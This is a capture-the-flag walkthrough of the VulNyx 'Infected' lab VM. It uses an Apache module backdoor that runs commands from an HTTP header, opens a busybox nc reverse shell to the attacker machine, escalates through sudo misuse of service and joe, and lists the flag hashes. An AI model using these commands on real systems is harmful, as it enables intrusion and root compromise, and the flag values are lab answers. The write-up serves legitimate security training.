# VulNyx - Infected

## Information

## Solution

### Enumeration
#### Nmap
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sCV -p- -T4 192.168.11.15  
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-06 09:34 +07
Nmap scan report for 192.168.11.15
Host is up (0.0013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey: 
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 08:00:27:54:66:23 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.26 seconds
```
#### Gobuster
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ gobuster dir -u http://192.168.11.15/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.11.15/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 278]
Progress: 220557 / 220557 (100.00%)
===============================================================
Finished
===============================================================
```
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ gobuster dir -u http://192.168.11.15/ -w /usr/share/seclists/Discovery/Web-Content/common.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.11.15/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 10701]
/info.php             (Status: 200) [Size: 114404]
/server-status        (Status: 403) [Size: 278]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
===============================================================
```

#### Nikto
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nikto -C all -h 192.168.11.15  
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.11.15
+ Target Hostname:    192.168.11.15
+ Target Port:        80
+ Start Time:         2026-05-06 09:42:47 (GMT7)
---------------------------------------------------------------------------
+ Server: Apache/2.4.57 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Server may leak inodes via ETags, header found with file /, inode: 29cd, size: 60b758550db9b, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD .
+ /info.php: Output from the phpinfo() function was found.
+ /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information. See: CWE-552
+ /info.php?file=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2
+ 26640 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2026-05-06 09:45:02 (GMT7) (135 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

![web-info.php](/walkthroughs/vulnyx/low-difficulty/18_infected/info-php.png)


### Shell
![apache2-backdoorMod](/walkthroughs/vulnyx/low-difficulty/18_infected/backdoor-mod.png)
#### Reverse shell
I find and review the following [exploit](https://github.com/WangYihang/Apache-HTTP-Server-Module-Backdoor/blob/main/exploit.py)

```bash
def exploit(host, port, command):
    headers = {"Backdoor": command}
    url = f"http://{host}:{port}/"
    response = requests.get(url, headers=headers)
    text = response.text
    print(text)
```
We can execute commands as the `www-data` user:
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -sX GET -H "Backdoor: id; hostname" "http://192.168.11.15"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
infected
```
We are trying to get a reverse shell:
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -sX GET -H "Backdoor: busybox nc 192.168.11.10 4444 -e sh" "http://192.168.11.15"
```

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.11.10] from (UNKNOWN) [192.168.11.15] 48236
id;hostname
uid=33(www-data) gid=33(www-data) groups=33(www-data)
infected
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@infected:/$ ^Z  
[1]+  Stopped                    nc -lvnp 4444

┌──(dungcngo㉿kali)-[/tmp]
└─$ stty -a
speed 38400 baud; rows 28; columns 85; line = 0;
intr = ^C; quit = ^\; erase = ^H; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>;
swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W;
lnext = ^V; discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl -ixon -ixoff
-iuclc -ixany -imaxbel iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl
echoke -flusho -extproc

┌──(dungcngo㉿kali)-[/tmp]
└─$ stty raw -echo;fg
nc -lvnp 4444
             export SHELL=bash
www-data@infected:/$ export TERM=xterm-256color
www-data@infected:/$ stty rows 28 columns 85
www-data@infected:/$ reset
```

#### Enumeration
```bash
www-data@infected:/$ sudo -l
Matching Defaults entries for www-data on infected:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-data may run the following commands on infected:
    (laurent) NOPASSWD: /usr/sbin/service
```

![service shell](/walkthroughs/vulnyx/low-difficulty/18_infected/service-shell.png)
```bash
www-data@infected:/$ sudo -u laurent service ../../bin/sh
$ id ; hostname
uid=1000(laurent) gid=1000(laurent) groups=1000(laurent)
infected
$ 
```

### Privilege Escalation
#### Enumeration
```bash
laurent@infected:/$ sudo -l
Matching Defaults entries for laurent on infected:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User laurent may run the following commands on infected:
    (root) NOPASSWD: /usr/bin/joe
```
#### Abuse
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ stty -a          
speed 38400 baud; rows 28; columns 88; line = 0;
intr = ^C; quit = ^\; erase = ^H; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>;
swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V;
discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl -ixon -ixoff -iuclc
-ixany -imaxbel iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl
echoke -flusho -extproc
                                                                                        
┌──(dungcngo㉿kali)-[/tmp]
└─$ stty raw -echo;fg     
[1]  + continued  nc -lvnp 4444
                               export SHELL=bash
laurent@infected:/$ export TERM=xterm-256color
laurent@infected:/$ stty rows 28 columns 88
laurent@infected:/$ reset
laurent@infected:/$ sudo -l
Matching Defaults entries for laurent on infected:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User laurent may run the following commands on infected:
    (root) NOPASSWD: /usr/bin/joe
laurent@infected:/$ sudo -u root /usr/bin/joe
```

![joe-shell](/walkthroughs/vulnyx/low-difficulty/18_infected/joe-shell.png)

```bash
root@infected:/# id ; hostname
uid=0(root) gid=0(root) groups=0(root)
infected
```

#### Flags
```bash
root@infected:/# find / -name root.txt -o -name user.txt 2>/dev/null | xargs <me root.tx
ffb4622f083564d104e0549e201703dc
6b9d5de6ddf297338e9ce2788198540c
```

***You are welcome!***
